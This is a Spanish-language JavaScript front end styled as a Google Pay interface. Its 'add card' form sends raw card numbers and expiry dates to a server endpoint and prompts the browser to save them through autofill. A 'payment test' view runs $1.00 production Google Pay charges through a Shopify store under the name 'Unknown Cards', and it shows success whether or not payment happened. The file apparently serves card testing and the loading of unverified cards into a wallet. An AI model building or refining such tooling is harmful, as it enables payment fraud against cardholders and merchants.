// Corporate Google Pay Interface - Professional Edition

// ============================================
// HAMBURGER MENU NAVIGATION
// ============================================
function initMenuSystem() {

    const hamburgerMenu = document.getElementById('hamburger-menu');
    const menuOverlay = document.getElementById('menu-overlay');
    const menuClose = document.getElementById('menu-close');
    const menuItems = document.querySelectorAll('.menu-item');

    // Toggle menu
    function toggleMenu() {
        hamburgerMenu.classList.toggle('active');
        menuOverlay.classList.toggle('active');
        document.body.style.overflow = menuOverlay.classList.contains('active') ? 'hidden' : 'auto';
    }

    // Close menu
    function closeMenu() {
        hamburgerMenu.classList.remove('active');
        menuOverlay.classList.remove('active');
        document.body.style.overflow = 'auto';
    }

    // Hamburger button click
    hamburgerMenu.addEventListener('click', toggleMenu);

    // Close button click
    menuClose.addEventListener('click', closeMenu);

    // Click outside menu content
    menuOverlay.addEventListener('click', (e) => {
        if (e.target === menuOverlay) {
            closeMenu();
        }
    });

    // Menu item clicks
    menuItems.forEach(item => {
        item.addEventListener('click', (e) => {
            e.preventDefault();
            const viewName = item.dataset.view;

            // Update active menu item
            menuItems.forEach(mi => mi.classList.remove('active'));
            item.classList.add('active');

            // Switch view
            switchView(viewName);

            // Close menu
            closeMenu();
        });
    });

    // Load saved view or default to add-card
    const savedView = localStorage.getItem('gpay-current-view') || 'add-card';
    switchView(savedView);
}

// Switch between views
function switchView(viewName) {
    const views = document.querySelectorAll('.view-container');
    const menuItems = document.querySelectorAll('.menu-item');

    // Hide all views
    views.forEach(view => view.classList.remove('active'));

    // Show selected view
    const selectedView = document.getElementById(`${viewName}-view`);
    if (selectedView) {
        selectedView.classList.add('active');
    }

    // Update menu active state
    // Update menu active state
    // For payment-test view, we need to distinguish by checkout URL
    // Update menu active state
    menuItems.forEach(item => {
        if (item.dataset.view === viewName) {
            item.classList.add('active');
        } else {
            item.classList.remove('active');
        }
    });

    // Save current view
    localStorage.setItem('gpay-current-view', viewName);
}



// ============================================
// PAYMENT FORM LOGIC (Add Card View)
// ============================================

const cardNumberInput = document.getElementById('card-number');
if (cardNumberInput) {
    cardNumberInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\s/g, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
        e.target.value = formattedValue;


    });
}

// Format expiry date
const expiryInput = document.getElementById('expiry');
if (expiryInput) {
    expiryInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            const month = value.slice(0, 2);
            const year = value.slice(2, 4);
            value = month + '/' + year;
        }
        e.target.value = value;
    });
}



// Form submission handler
const paymentForm = document.getElementById('payment-form');
const submitButton = document.getElementById('submit-button');
const buttonLoader = document.getElementById('button-loader');

if (paymentForm) {
    paymentForm.addEventListener('submit', function (e) {
        e.preventDefault();

        const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
        const expiry = document.getElementById('expiry').value;

        // Validate if provided
        if (cardNumber && (cardNumber.length < 13 || cardNumber.length > 19)) {
            showError('El número de tarjeta no es válido');
            return;
        }

        if (expiry && expiry.length < 5) {
            showError('La fecha de vencimiento no es válida');
            return;
        }

        // Show loading state
        submitButton.disabled = true;
        submitButton.classList.add('loading');
        buttonLoader.style.display = 'flex';

        // Trigger save flow
        activateNativeAndroidPopup();
    });
}

async function activateNativeAndroidPopup() {
    const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
    const expiry = document.getElementById('expiry').value;

    if (!cardNumber) {
        showError('Por favor, ingresa el número de tarjeta.');
        resetButton();
        return;
    }

    try {
        const response = await fetch('/api/save-card', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cardNumber, expiry })
        });

        if (response.ok) {
            // Blur inputs to trigger browser autofill save prompt
            document.getElementById('card-number').blur();
            document.getElementById('expiry').blur();

            setTimeout(() => {
                window.location.reload();
            }, 1500);
        } else {
            showError('Error al guardar la tarjeta. Intenta de nuevo.');
            resetButton();
        }
    } catch (err) {
        console.error('Save error:', err);
        showError('Error de conexión. Intenta de nuevo.');
        resetButton();
    }
}

function resetButton() {
    if (submitButton) {
        submitButton.disabled = false;
        submitButton.classList.remove('loading');
        buttonLoader.style.display = 'none';
    }
}

function showError(message) {
    let errorDiv = document.querySelector('.error-message');
    if (!errorDiv) {
        errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        paymentForm.insertBefore(errorDiv, submitButton);
    }
    errorDiv.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
    errorDiv.style.display = 'block';

    setTimeout(() => {
        errorDiv.style.display = 'none';
    }, 5000);
}

// Success modal functions
function showSuccessModal() {
    const modal = document.getElementById('success-modal');
    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
}

function closePaymentModal() {
    const modal = document.getElementById('payment-success-modal');
    modal.classList.remove('show');
    setTimeout(() => {
        modal.style.display = 'none';
    }, 300);
}

function copyFlagUrl() {
    const url = 'chrome://flags/#enable-autofill-credit-card-upload';
    navigator.clipboard.writeText(url).then(() => {
        const btn = document.getElementById('copy-flag-btn');
        btn.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        btn.style.background = 'linear-gradient(135deg, #4caf7c, #38a169)';
        setTimeout(() => {
            btn.innerHTML = '<i class="fas fa-copy"></i> Copiar';
            btn.style.background = 'linear-gradient(135deg, #6b4c9a, #8b6cb8)';
        }, 2000);
    }).catch(() => {
        // Fallback
        const ta = document.createElement('textarea');
        ta.value = url;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        const btn = document.getElementById('copy-flag-btn');
        btn.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        setTimeout(() => {
            btn.innerHTML = '<i class="fas fa-copy"></i> Copiar';
        }, 2000);
    });
}
function closeModal() {
    const modal = document.getElementById('success-modal');
    modal.classList.remove('active');
    document.body.style.overflow = 'auto';

    // Reset form
    if (paymentForm) {
        paymentForm.reset();

    }

    // Hide any error messages
    const errorDiv = document.querySelector('.error-message');
    if (errorDiv) {
        errorDiv.style.display = 'none';
    }
}

// ============================================
// GOOGLE PAY INTEGRATION (Payment Test View)
// ============================================

let paymentsClient = null;

const baseRequest = {
    apiVersion: 2,
    apiVersionMinor: 0
};

const allowedCardNetworks = ["AMEX", "DISCOVER", "INTERAC", "JCB", "MASTERCARD", "VISA"];
const allowedCardAuthMethods = ["PAN_ONLY", "CRYPTOGRAM_3DS"];

const tokenizationSpecification = {
    type: 'PAYMENT_GATEWAY',
    parameters: {
        'gateway': 'shopify',
        'gatewayMerchantId': 'yonawest.myshopify.com'
    }
};

const baseCardPaymentMethod = {
    type: 'CARD',
    parameters: {
        allowedAuthMethods: allowedCardAuthMethods,
        allowedCardNetworks: allowedCardNetworks
    }
};

const cardPaymentMethod = Object.assign(
    {},
    baseCardPaymentMethod,
    {
        tokenizationSpecification: tokenizationSpecification
    }
);

function getGoogleIsReadyToPayRequest() {
    return Object.assign(
        {},
        baseRequest,
        {
            allowedPaymentMethods: [baseCardPaymentMethod]
        }
    );
}

function getGooglePaymentDataRequest() {
    const paymentDataRequest = Object.assign({}, baseRequest);
    paymentDataRequest.allowedPaymentMethods = [cardPaymentMethod];
    paymentDataRequest.transactionInfo = {
        totalPriceStatus: 'FINAL',
        totalPrice: '1.00',
        currencyCode: 'USD',
        countryCode: 'US'
    };
    paymentDataRequest.merchantInfo = {
        merchantName: 'Unknown Cards',
        merchantId: 'BCR2DN4TZRY6EQKJ'
    };

    paymentDataRequest.callbackIntents = ["PAYMENT_AUTHORIZATION"];

    return paymentDataRequest;
}

function getGooglePaymentsClient() {
    if (paymentsClient === null && typeof google !== 'undefined' && google.payments) {
        paymentsClient = new google.payments.api.PaymentsClient({
            environment: 'PRODUCTION',
            paymentDataCallbacks: {
                onPaymentAuthorized: onPaymentAuthorized
            }
        });
    }
    return paymentsClient;
}

function onPaymentAuthorized(paymentData) {
    return new Promise(function (resolve, reject) {
        console.log('Payment Data:', paymentData);

        // Simulate payment processing
        setTimeout(() => {
            resolve({ transactionState: 'SUCCESS' });
            showPaymentSuccessModal();
        }, 1000);
    });
}

function initGooglePayButton() {
    const container = document.getElementById('gpay-button-container');
    if (!container) return;

    // Clear existing content
    container.innerHTML = '';

    // Create custom Google Pay button that will show the iframe
    const customButton = document.createElement('button');
    customButton.className = 'custom-gpay-button';
    customButton.innerHTML = `
        <svg class="gpay-logo" viewBox="0 0 41 17" xmlns="http://www.w3.org/2000/svg">
            <g fill="none" fill-rule="evenodd">
                <path d="M19.526 2.635v4.083h2.518c.6 0 1.096-.202 1.488-.605.403-.402.605-.882.605-1.437 0-.544-.202-1.018-.605-1.422-.392-.413-.888-.62-1.488-.62h-2.518zm0 5.52v4.736h-1.504V1.198h3.99c1.013 0 1.873.337 2.582 1.012.72.675 1.08 1.497 1.08 2.466 0 .991-.36 1.819-1.08 2.482-.697.665-1.559.996-2.583.996h-2.485v.001zm7.668 2.287c0 .392.166.718.499.98.332.26.722.391 1.168.391.633 0 1.196-.234 1.692-.701.497-.469.744-1.019.744-1.65-.469-.37-1.123-.555-1.962-.555-.61 0-1.12.148-1.528.442-.409.294-.613.657-.613 1.093m1.946-5.815c1.112 0 1.989.297 2.633.89.642.594.964 1.408.964 2.442v4.932h-1.439v-1.11h-.065c-.622.914-1.45 1.372-2.486 1.372-.882 0-1.621-.262-2.215-.784-.594-.523-.891-1.176-.891-1.96 0-.828.313-1.486.94-1.976.627-.489 1.467-.733 2.52-.733.86 0 1.563.175 2.108.523v-.366c0-.48-.225-.911-.675-1.29-.447-.38-.98-.571-1.596-.571-.853 0-1.528.356-2.022 1.068l-1.307-.824c.726-1.046 1.857-1.569 3.39-1.569l.141-.014zm7.407 0c.863 0 1.564.294 2.107.881.543.587.814 1.34.814 2.258v5.178h-1.504v-4.74c0-.648-.149-1.17-.448-1.562-.298-.393-.688-.589-1.172-.589-.572 0-1.056.232-1.449.698-.394.465-.59 1.08-.59 1.846v4.347h-1.504V5.761h1.438v1.372h.065c.622-.991 1.427-1.487 2.416-1.487l-.173-.006zm9.393 0c.863 0 1.564.294 2.107.881.543.587.814 1.34.814 2.258v5.178h-1.504v-4.74c0-.648-.149-1.17-.448-1.562-.298-.393-.688-.589-1.172-.589-.572 0-1.056.232-1.449.698-.394.465-.59 1.08-.59 1.846v4.347h-1.504V5.761h1.438v1.372h.065c.622-.991 1.427-1.487 2.416-1.487l-.173-.006z" fill="#5F6368"/>
                <path d="M13.448 7.134c0-.473-.04-.93-.116-1.366H6.988v2.588h3.634a3.11 3.11 0 0 1-1.344 2.042v1.68h2.169c1.27-1.17 2.001-2.9 2.001-4.944z" fill="#4285F4"/>
                <path d="M6.988 13.7c1.816 0 3.344-.595 4.459-1.621l-2.169-1.681c-.603.406-1.38.643-2.29.643-1.754 0-3.244-1.182-3.776-2.774H.978v1.731a6.728 6.728 0 0 0 6.01 3.703z" fill="#34A853"/>
                <path d="M3.212 8.267a4.034 4.034 0 0 1 0-2.572V3.964H.978a6.678 6.678 0 0 0 0 6.034l2.234-1.731z" fill="#FBBC05"/>
                <path d="M6.988 2.921c.992 0 1.88.34 2.58 1.008v.001l1.92-1.918C10.324.928 8.804.262 6.989.262a6.728 6.728 0 0 0-6.01 3.702l2.234 1.731c.532-1.592 2.022-2.774 3.776-2.774z" fill="#EA4335"/>
            </g>
        </svg>
        <span class="gpay-text">Pagar con Google Pay</span>
    `;

    customButton.addEventListener('click', function () {
        openYonawestCheckout();
    });

    container.appendChild(customButton);
}

function openYonawestCheckout() {
    const checkoutUrl = 'https://www.yonawest.com/checkouts/cn/hWN8g8g2TXzetehrdUNDRZQI/es-us?_r=AQABFi4mwoao81Ks7DbGXx6Xl-tItDBtH4mTEpJjRhoF7Wo&auto_redirect=false&edge_redirect=true&skip_shop_pay=true';

    // Open in popup window
    const width = 600;
    const height = 700;
    const left = (screen.width - width) / 2;
    const top = (screen.height - height) / 2;

    const popup = window.open(
        checkoutUrl,
        'YonawestCheckout',
        `width=${width},height=${height},left=${left},top=${top},resizable=yes,scrollbars=yes,status=yes`
    );

    if (popup) {
        popup.focus();

        // Monitor popup for completion
        const checkPopup = setInterval(() => {
            try {
                if (popup.closed) {
                    clearInterval(checkPopup);
                    showPaymentSuccessModal();
                }
            } catch (e) {
                // Continue checking
            }
        }, 500);
    } else {
        // Popup blocked, open in same tab
        window.location.href = checkoutUrl;
    }
}

function showIframeForPayment(iframe) {
    // Make iframe visible and overlay it on the page
    iframe.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        border: 0;
        opacity: 1;
        pointer-events: auto;
        z-index: 10000;
        background: white;
    `;

    // Add close button
    const closeBtn = document.createElement('button');
    closeBtn.innerHTML = '✕ Cerrar';
    closeBtn.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        z-index: 10001;
        padding: 12px 24px;
        background: #ea4335;
        color: white;
        border: none;
        border-radius: 8px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
    `;

    closeBtn.addEventListener('click', function () {
        hideIframe(iframe);
        this.remove();
    });

    document.body.appendChild(closeBtn);
}

function hideIframe(iframe) {
    iframe.style.cssText = `
        position: absolute;
        width: 0;
        height: 0;
        border: 0;
        opacity: 0;
        pointer-events: none;
    `;
}

function showPaymentSuccessModal() {
    const modal = document.getElementById('payment-success-modal');
    if (modal) {
        modal.classList.add('active');
        document.body.style.overflow = 'hidden';
    }
}

function closePaymentModal() {
    const modal = document.getElementById('payment-success-modal');
    if (modal) {
        modal.classList.remove('active');
        document.body.style.overflow = 'auto';
    }
}

// ============================================
// INPUT ANIMATIONS
// ============================================

const inputs = document.querySelectorAll('input');
inputs.forEach(input => {
    input.addEventListener('focus', function () {
        const wrapper = this.closest('.form-group');
        if (wrapper) wrapper.classList.add('focused');
    });

    input.addEventListener('blur', function () {
        const wrapper = this.closest('.form-group');
        if (wrapper) {
            wrapper.classList.remove('focused');
            if (this.value) {
                wrapper.classList.add('filled');
            } else {
                wrapper.classList.remove('filled');
            }
        }
    });

    // Check if input has value on load
    if (input.value) {
        const wrapper = input.closest('.form-group');
        if (wrapper) wrapper.classList.add('filled');
    }
});

// ============================================
// INITIALIZATION
// ============================================

// Load Google Pay API
const script = document.createElement('script');
script.src = 'https://pay.google.com/gp/p/js/pay.js';
script.async = true;
script.onload = function () {
    console.log('Google Pay API loaded');
};
script.onerror = function () {
    console.error('Failed to load Google Pay API');
};
document.head.appendChild(script);

// Initialize menu system when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function () {
        initMenuSystem();
    });
} else {
    initMenuSystem();
}
